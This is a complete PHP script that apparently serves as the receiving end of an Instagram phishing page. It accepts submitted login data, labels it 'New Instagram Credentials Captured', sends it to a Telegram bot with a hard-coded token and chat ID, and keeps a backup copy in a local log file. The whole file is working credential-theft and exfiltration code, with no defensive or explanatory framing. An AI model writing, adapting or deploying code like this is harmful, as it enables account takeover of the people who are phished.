<?php

// Load environment variables from .env file if it exists
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Get configuration from environment variables
$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
$log_file = getenv('LOG_FILE') ?: "credentials_log.txt";
$enable_backup_logging = getenv('ENABLE_BACKUP_LOGGING') !== 'false';

if(isset($_POST["data"])) {
    $credentials = $_POST["data"];
    
    // Format message for Telegram
    $message = "🔔 New Instagram Credentials Captured:\n\n" . strip_tags($credentials);
    
    // Send to Telegram
    $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
    
    $post_fields = array(
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    );
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Optional: Log to file as backup
    if ($enable_backup_logging) {
        $log_entry = date("Y-m-d H:i:s") . " - " . $credentials . " [HTTP: " . $http_code . "]\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);
    }
    
    echo ($http_code == 200) ? "Success" : "Failed";
} else {
    echo "No data received";
}

?>

